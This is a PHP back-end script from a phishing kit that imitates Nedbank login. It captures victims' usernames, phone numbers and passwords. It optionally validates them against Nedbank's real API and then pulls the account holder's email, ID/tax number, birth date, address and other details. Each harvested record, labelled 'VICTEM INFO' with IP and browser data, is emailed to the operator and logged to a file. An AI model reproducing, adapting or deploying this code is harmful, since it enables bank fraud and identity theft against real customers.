<?php
ob_start();
session_start();
error_reporting(0);
include'../config.php';
include'../function.php';
include'../robots.php';
if (!isset($_SESSION['spox'])) {
  //  header('HTTP/1.0 403 Forbidden');
  //  die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  //  exit();
}

$username = $_POST['username'];
$phonword = $_POST['phonword'];
$password = $_POST['password'];


if (empty($username) or empty($password)) {
    echo "bad";exit();
}

if($true_login == "yes"){

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.nedsecure.co.za/nedbank/nedbankid/v3/users/authenticate');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "{\"username\":\"".$username."\",\"phonword\":\"".phonword."\",\"password\":\"".$password."\",\"appliesTo\":\"https://newmoneyweb/\",\"secretType\":\"PWD\"}");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$headers = array();
$headers[] = 'Accept: application/json';
$headers[] = 'Authorization: Bearer '.$here.'';
$headers[] = 'Referer: ';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36';
$headers[] = 'Content-Type: application/json';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$json=curl_exec($ch);
$set = json_decode($json, true);

    if ($set['MetaData']['Message'] == "Authentication Failed" or $set['MetaData']['Message'] !== "Success") {
        echo "bad";exit();
    }
    if ($set['MetaData']['Message'] == "Success") {
        $token = $set['Data']['TokenValue'];
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.nedsecure.co.za/nedbank/clients/clientdetails');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
        curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
        $headers = array();
        $headers[] = 'Accept: application/json';
        $headers[] = 'Authorization: Bearer '.$token.'';
        $headers[] = 'Referer: ';
        $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36';
        $headers[] = 'Content-Type: application/json';
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        $json2=curl_exec($ch);
        $set2 = json_decode($json2, true);
        if (isset($set2['EmailAddress'])) {
            $emaila = $set2['EmailAddress'];
            $_SESSION['email'] = $emaila;
        }if (isset($set2['FullNames'])) {
            $fullname = $set2['FullNames'];
            $_SESSION['fullname'] = $fullname;
        }if (isset($set2['CellNumber'])) {
            $phonenumber = $set2['CellNumber'];
            $_SESSION['phonenumber'] = $phonenumber;
        }if (isset($set2['BirthDate'])) {
            $bthd = $set2['BirthDate'];
            $_SESSION['bthd'] = $bthd;
        }if (isset($set2['IdOrTaxIdNo'])) {
            $idtaxid = $set2['IdOrTaxIdNo'];
            $_SESSION['idtaxid'] = $idtaxid;
        }if (isset($set2['Address']['AddressCity'])) {
            $city = $set2['Address']['AddressCity'];
            $_SESSION['city'] = $city;
        }if (isset($set2['Address']['AddressPostalCode'])) {
            $zipcode = $set2['Address']['AddressPostalCode'];
            $_SESSION['zipcode'] = $zipcode;
        }if (isset($set2['Gender'])) {
            $gender = $set2['Gender'];
            $_SESSION['gender'] = $gender;
        }

    }

}

$_SESSION['username'] = $username;
$_SESSION['phonword'] = $phonword;
$_SESSION['password'] = $password;
$resulta  = "+ --------------[ NedBank DSOX ]---------------+\n";
$resulta .= "[User ID]: ".$_POST['username']."\n";
$resulta .= "[Phone Number]: ".$_POST['phonword']."\n";
$resulta .= "[Password]: ".$_POST['password']."\n";
if($true_login == "yes"){
    if (isset($fullname)) { $resulta .= "[Full Name]: ".$fullname."\n"; }   
    if (isset($phonenumber)) { $resulta .= "[Phone Number]: ".$phonenumber."\n"; }   
    if (isset($emaila)) { $resulta .= "[Email]: ".$emaila."\n"; }   
    if (isset($bthd)) { $resulta .= "[Date Of Birth]: ".$bthd."\n"; }   
    if (isset($idtaxid)) { $resulta .= "[ID/TaxID ]: ".$idtaxid."\n"; }   
    if (isset($city)) { $resulta .= "[City]: ".$city."\n"; }   
    if (isset($zipcode)) { $resulta .= "[Zip Code]: ".$zipcode."\n"; }   
    if (isset($gender)) { $resulta .= "[Gender]: ".$gender."\n"; }   
}

$resulta .= "+ --------------[ VICTEM INFO ]---------------+\n";
$resulta .= "IP Address: ".$ip_spox."\n";
$resulta .= "Country: ".$country_spox."\n";
$resulta .= "City: ".$city_spox."\n";
$resulta .= "OS/Browser: ".$_SESSION['browser']."\n";
$resulta .= "Time: ".date("d/m/Y h:i:sa")."\n";
$resulta .= "User Agent: ".$_SESSION['platform']."\n";
$resulta .= "+ --------------[ NedBank DSOX ]---------------+\n";

$subject = "#NedBank LOGIN: [{$_POST['username']}] [ {$country_spox} - {$_SESSION['browser']} - {$ip_spox} ]";
$headers="From: NedBank POX <support@dsox.dz>\r\n";
$headers.="MIME-Version: 1.0\r\n";
$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
if($mail_result == "yes"){
    @mail($email,$subject,$resulta,$headers);
    include'../rbots.php';
}if($text_result == "yes"){
    $spoxy = fopen("logs.txt","a+");
    fwrite($spoxy,$resulta);
    fclose($spoxy);
}

echo "good";exit();

